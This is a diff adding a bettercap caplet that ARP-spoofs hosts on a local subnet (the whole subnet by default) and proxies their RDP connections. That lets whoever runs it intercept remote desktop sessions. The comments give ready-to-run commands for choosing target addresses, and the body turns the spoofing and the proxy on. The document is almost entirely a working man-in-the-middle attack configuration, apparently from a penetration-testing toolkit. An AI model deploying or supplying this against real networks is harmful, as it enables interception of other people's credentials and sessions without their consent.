@@ -1,0 +1,30 @@
+# This module lets you arp spoof desired targets, and proxy their RDP connections.
+# 
+# Targets the whole subnet by default. Can be configured in bettercap or in this file.
+#   
+# To change arp-spoofed targets :
+#	sudo ./bettercap -caplet rdp-sniffer.cap -eval "set arp.spoof.targets 192.168.0.50, 192.168.0.51;"
+#
+# To change RDP proxy targets :
+#	sudo ./bettercap -caplet rdp-sniffer.cap -eval "set rdp.proxy.targets 192.168.0.50;"
+#
+# To change both targets :
+#	sudo ./bettercap -caplet rdp-sniffer.cap -eval "set arp.spoof.targets 192.168.0.50, 192.168.0.51; set rdp.proxy.targets 192.168.0.50;"
+
+# Setup arp spoofing
+set arp.spoof.internal true
+
+# Setup targets (Uncomment to specify target)
+#set arp.spoof.targets 192.168.0.50, 192.168.0.51
+#set rdp.proxy.targets 192.168.0.50
+
+# Start everything
+arp.spoof on
+rdp.proxy on
+
+# Silence net.recon to avoid useless spam
+events.ignore endpoint
+
+# Start fresh
+events.clear
+clear
